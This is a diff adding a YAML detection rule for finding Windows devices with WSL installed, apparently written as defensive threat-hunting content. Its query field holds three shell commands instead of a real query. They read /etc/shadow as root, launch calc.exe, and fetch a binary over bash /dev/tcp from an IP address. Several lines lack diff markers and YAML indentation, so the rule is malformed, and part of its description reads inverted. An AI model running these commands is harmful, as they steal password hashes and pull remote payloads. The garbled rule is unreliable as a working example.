@@ -1,0 +1,20 @@
+title: List devices that have WSL installed
+id: 5e7d6b06-bd0d-47de-89a8-7b40f6ba5d80
+status: experimental
+level: medium
+description: |
+  Windows Subsystem for Linux may be used by adversaries to perform actions as root, or to download files. This query lists all devices that have WSL installed and it was active in the last 30 days. This may give an indidcation about the usage in your environment. Microsoft recommends listing WSL, if there is no scenario you explicitly require them. WSL Should be installed in the folder: C:\Windows\System32\wsl.exe. From the Lolbas project some suspicious queries that can be executed by WSL are:
+author: Bert-JanP
+logsource:
+  product: microsoft_security
+  service: kql
+detection:
+  _kql_query: |
+    wsl.exe -u root -e cat /etc/shadow
+
+wsl.exe --system calc.exe
+
+wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
+  condition: _kql_query
+references:
+  - https://github.com/Bert-JanP/Hunting-Queries-Detection-Rules
